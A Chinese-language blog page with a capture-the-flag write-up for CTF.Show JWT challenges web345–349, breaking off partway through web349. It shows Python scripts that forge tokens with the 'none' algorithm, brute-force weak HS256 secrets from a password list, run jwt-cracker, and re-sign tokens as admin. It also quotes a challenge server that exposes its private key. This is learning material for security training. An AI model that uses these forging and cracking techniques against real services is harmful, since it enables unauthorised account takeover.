@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://guo.moe/favicon.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://guo.moe/favicon.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"guo.moe","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="JWT 的解密可以在此处完成，同时 JWT 由三部分组成：Header，Payload以及Secret，前两部分由base64编码，并且三个部分用 . 进行拼接 JWT.IO web345知识点 JWT 的解码与使用  JWT 无密钥情况下可任意修改前方数据">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Klee-CTF】CTF.Show Web入门 JWT 专题 web345～web350">
+<meta property="og:url" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT.html">
+<meta property="og:site_name" content="果果说">
+<meta property="og:description" content="JWT 的解密可以在此处完成，同时 JWT 由三部分组成：Header，Payload以及Secret，前两部分由base64编码，并且三个部分用 . 进行拼接 JWT.IO web345知识点 JWT 的解码与使用  JWT 无密钥情况下可任意修改前方数据">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT/Untitled.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT/Untitled%201.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT/Untitled%202.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT/Untitled%203.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT/Untitled%204.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT/Untitled%205.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT/Untitled%206.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT/Untitled%207.png">
+<meta property="og:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT/Untitled%208.png">
+<meta property="article:published_time" content="2021-08-30T04:00:00.000Z">
+<meta property="article:modified_time" content="2021-08-30T12:28:36.000Z">
+<meta property="article:author" content="Guoguo">
+<meta property="article:tag" content="果果说">
+<meta property="article:tag" content="果果的博客">
+<meta property="article:tag" content="Guoguo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT/Untitled.png">
+
+<link rel="canonical" href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>【Klee-CTF】CTF.Show Web入门 JWT 专题 web345～web350 | 果果说</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-69554402-1"></script>
+    <script data-pjax>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-69554402-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="果果说" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">果果说</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Guoguo's Blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-友情链接">
+
+    <a href="/links/" rel="section"><i class="fa fa-user fa-fw"></i>友情链接</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-JWT.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://guo.moe/favicon.jpg">
+      <meta itemprop="name" content="Guoguo">
+      <meta itemprop="description" content="找不到路，就自己走一条出来。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="果果说">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【Klee-CTF】CTF.Show Web入门 JWT 专题 web345～web350
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-08-30 12:00:00 / 修改时间：20:28:36" itemprop="dateCreated datePublished" datetime="2021-08-30T12:00:00+08:00">2021-08-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/" itemprop="url" rel="index"><span itemprop="name">技术篇</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>JWT 的解密可以在此处完成，同时 JWT 由三部分组成：Header，Payload以及Secret，前两部分由base64编码，并且三个部分用 . 进行拼接</p>
+<p><a target="_blank" rel="noopener" href="https://jwt.io/">JWT.IO</a></p>
+<h1 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li><p>JWT 的解码与使用</p>
+</li>
+<li><p>JWT 无密钥情况下可任意修改前方数据</p>
+<span id="more"></span></li>
+</ul>
+<h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>从 Cookie 中可获得 JWT 的数据，并放入 <a target="_blank" rel="noopener" href="http://jwt.io/">jwt.io</a> 中</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled.png" alt="Untitled"></p>
+<p>由 alg:None ，我们可以知道该jwt无签名算法，我们可以任意修改数据。</p>
+<p>但是这里编码后的jwt不知道为什么少了个.，在下一题缺少这个.又无法正常提交</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%201.png" alt="Untitled"></p>
+<p>右键查看源代码，发现有一个访问 /admin 的提示，但注意这里不应该访问 /admin而应该访问 /admin/ ，否则将会错误地跳转到 80 端口的页面导致404。</p>
+<p><del>但是此题无法依照wp做出来，先跳过。。。</del></p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%202.png" alt="Untitled"></p>
+<p>将捕获后的auth发送至Decoder，解码后修改sub字段为admin再编码，编码后的内容去除等于号再发送至Repeater覆盖进行访问获得flag。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">JSON Web Token 入门教程</a></p>
+<p><a target="_blank" rel="noopener" href="https://jwt.io/">JWT.IO</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2338"></a></p>
+<h1 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>修改加密方式为none使其可以任意修改数据内容</li>
+</ul>
+<h2 id="做题-1"><a href="#做题-1" class="headerlink" title="做题"></a>做题</h2><p>将cookie中的jwt交由burpsuite解码，可以看见由三部分组成，分别为 Header.Content.Key</p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%203.png" alt="Untitled"></p>
+<p>在此题中我们显然是没有办法直接拿到它的密钥的，但是在测试时，为了方便可以将加密方式设置为none，这样密钥设置为任何值都是可以，包括空值。</p>
+<p><del>我们可以使用burpsuite来直接修改，将后面的key部分直接去除，然后再将中间段的sub将user改为admin即可</del></p>
+<p>（测试了一下，发现上面这种方法并不可用）</p>
+<p>我们还可以利用 Python 中的 pyjwt 库（使用 <code>pip install pyjwt</code> 来安装）来编码一段jwt串</p>
+<p>从jwt中提取得到关键数据 Header <code>&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</code>，Content <code>&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1630149052,&quot;exp&quot;:1630156252,&quot;nbf&quot;:1630149052,&quot;sub&quot;:&quot;admin&quot;,&quot;jti&quot;:&quot;aeb0d5d3cb6eb7783cfb000aa990034f&quot;&#125;</code> 并用pycharm进行编码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1630149052</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1630156252</span>,</span><br><span class="line">    <span class="string">&quot;nbf&quot;</span>: <span class="number">1630149052</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;aeb0d5d3cb6eb7783cfb000aa990034f&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;&quot;</span>, <span class="comment"># 密钥，此处置为空</span></span><br><span class="line">    algorithm=<span class="string">&quot;none&quot;</span>, <span class="comment"># 加密方式</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>
+
+<p>编码后输出 <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMDE0OTA1MiwiZXhwIjoxNjMwMTU2MjUyLCJuYmYiOjE2MzAxNDkwNTIsInN1YiI6ImFkbWluIiwianRpIjoiYWViMGQ1ZDNjYjZlYjc3ODNjZmIwMDBhYTk5MDAzNGYifQ.</code></p>
+<h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/112525267">[CTFSHOW]JWT_Y4tacker的博客-CSDN博客_ctf jwt</a></p>
+<h1 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>对称加密算法 HS256 密钥的爆破</li>
+<li>Python strip 移除开头或结尾的字符，默认是空格或换行符</li>
+</ul>
+<h2 id="做题-2"><a href="#做题-2" class="headerlink" title="做题"></a>做题</h2><p>根据参考资料1，可通过报错来判定key是否有效</p>
+<h3 id="通过-Python-脚本-常用密码破解"><a href="#通过-Python-脚本-常用密码破解" class="headerlink" title="通过 Python 脚本 + 常用密码破解"></a>通过 Python 脚本 + 常用密码破解</h3><blockquote>
+<p>1.若签名直接校验失败，则 key_ 为有效密钥；<br>2.若因数据部分预定义字段错误<br>（jwt.exceptions.ExpiredSignatureError,<br>jwt.exceptions.InvalidAudienceError,<br>jwt.exceptions.InvalidIssuedAtError,<br>jwt.exceptions.InvalidIssuedAtError,<br>jwt.exceptions.ImmatureSignatureError）导致校验失败，说明并非密钥错误导致，则 key_ 也为有效密钥；<br>3.若因密钥错误（jwt.exceptions.InvalidSignatureError）导致校验失败，则 key_ 为无效密钥；<br>4.若为其他原因（如，JWT 字符串格式错误）导致校验失败，根本无法验证当前 key_ 是否有效。<br>作者：littlebin404<br>链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/acbb936e87df">https://www.jianshu.com/p/acbb936e87df</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
+</blockquote>
+<p>考虑到一般人可能会使用自己的各种密码进行设置，可以用 web21 提供的字典进行测试。</p>
+<p>我们可以通过下列代码进行破解</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMDE1MTIyNSwiZXhwIjoxNjMwMTU4NDI1LCJuYmYiOjE2MzAxNTEyMjUsInN1YiI6InVzZXIiLCJqdGkiOiI5MzY0M2Y3YThkZTI4ZTdkZDEwZjk0MGY5M2JlYjQ3NyJ9.1FWDoI6Vhu3PSCUuGMvb0VX2SmGjqz02YFS-z-uJEeo&quot;</span> <span class="comment"># 题目中的 token</span></span><br><span class="line">password_file = <span class="string">&quot;/Users/kelly/Downloads/passwords.txt&quot;</span> <span class="comment"># 密码文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(password_file) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        line = line.strip() <span class="comment"># 去除每行后面的换行</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(token, verify=<span class="literal">True</span>, key=line, algorithms=<span class="string">&quot;HS256&quot;</span>) <span class="comment"># 设置编码方式为 HS256</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;key: &#x27;</span>, line)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError</span><br><span class="line">                , jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">                jwt.exceptions.ImmatureSignatureError): <span class="comment"># 出现这些错误，虽然表示过期之类的错误，但是密钥是正确的</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;key: &quot;</span>, line)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError: <span class="comment"># 签名错误则表示密钥不正确</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Failed: &quot;</span>, line)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Found.&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%204.png" alt="Untitled"></p>
+<h3 id="通过-jwt-cracker-进行破解"><a href="#通过-jwt-cracker-进行破解" class="headerlink" title="通过 jwt-cracker 进行破解"></a>通过 jwt-cracker 进行破解</h3><p>使用 BlackArch 或者 Kali 之类的，可以使用 jwt-cracker 进行全自动破解，但是速度较慢，命令为 jwt-cracker [jwt-token]</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt-cracker eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMDE1MTIyNSwiZXhwIjoxNjMwMTU4NDI1LCJuYmYiOjE2MzAxNTEyMjUsInN1YiI6InVzZXIiLCJqdGkiOiI5MzY0M2Y3YThkZTI4ZTdkZDEwZjk0MGY5M2JlYjQ3NyJ9<span class="number">.1</span>FWDoI6Vhu3PSCUuGMvb0VX2SmGjqz02YFS-z-uJEeo</span><br></pre></td></tr></table></figure>
+
+<p>最后run出来密钥为 123456，可使用 web346 的代码重新合成一个 jwt</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1630151225</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1630158425</span>,</span><br><span class="line">    <span class="string">&quot;nbf&quot;</span>: <span class="number">1630151225</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,  <span class="comment"># 记得改这里呀</span></span><br><span class="line">    <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;93643f7a8de28e7dd10f940f93beb477&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;123456&quot;</span>,  <span class="comment"># 这里输入之前破解得到的密钥</span></span><br><span class="line">    algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># 这里改成和题目一样的 HS256</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/acbb936e87df">基于JWT的token弱密钥爆破</a></p>
+<h1 id="其他资料"><a href="#其他资料" class="headerlink" title="其他资料"></a>其他资料</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6776#toc-7">https://xz.aliyun.com/t/6776#toc-7</a></p>
+<h1 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>jwt-cracker 破解的使用</li>
+</ul>
+<h2 id="做题-3"><a href="#做题-3" class="headerlink" title="做题"></a>做题</h2><p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%205.png" alt="Untitled"></p>
+<p>使用 jwt-cracker 破解可得密码为 aaab</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">content = &#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1630160569</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1630167769</span>,</span><br><span class="line">  <span class="string">&quot;nbf&quot;</span>: <span class="number">1630160569</span>,</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;7a62ed74141fba98f405ca3fe23ebb91&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">token = jwt.encode(</span><br><span class="line">    content,</span><br><span class="line">    <span class="string">&quot;aaab&quot;</span>,  <span class="comment"># 这里输入之前破解得到的密钥</span></span><br><span class="line">    algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># 这里改成和题目一样的 HS256</span></span><br><span class="line">    headers=header</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>获得 token <code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMDE2MDU2OSwiZXhwIjoxNjMwMTY3NzY5LCJuYmYiOjE2MzAxNjA1NjksInN1YiI6ImFkbWluIiwianRpIjoiN2E2MmVkNzQxNDFmYmE5OGY0MDVjYTNmZTIzZWJiOTEifQ.Ry2pggYXHznUje2KnM2In8Tku3RwuftuKIY3t4X3Hns</code></p>
+<p><img data-src="CTF-Show-Get-Started-with-the-web-JWT/Untitled%206.png" alt="Untitled"></p>
+<h1 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h1><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul>
+<li>node.js 中 Express 可通过 public 文件夹映射静态文件，从而下载</li>
+</ul>
+<h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.readFileSync(process.cwd()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.sign(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.cookie(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.end(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">	res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">	<span class="keyword">var</span> auth = req.cookies.auth;</span><br><span class="line">	<span class="keyword">var</span> cert = fs.readFileSync(process.cwd()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">	jwt.verify(auth, cert, <span class="function"><span class="keyword">function</span>(<span class="params">err, decoded</span>) </span>&#123;</span><br><span class="line">	  <span class="keyword">if</span>(decoded.user===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">	  	res.end(flag);</span><br><span class="line">	  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	  	res.end(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">	  &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="做题-4"><a href="#做题-4" class="headerlink" title="做题"></a>做题</h2><p>由题，我们可以得知其密钥存放于 /public/private.key，下载获得，并且编写 node.js 代码，注意需要提前安装好 jsonwebtoken 的 npm 包</p>
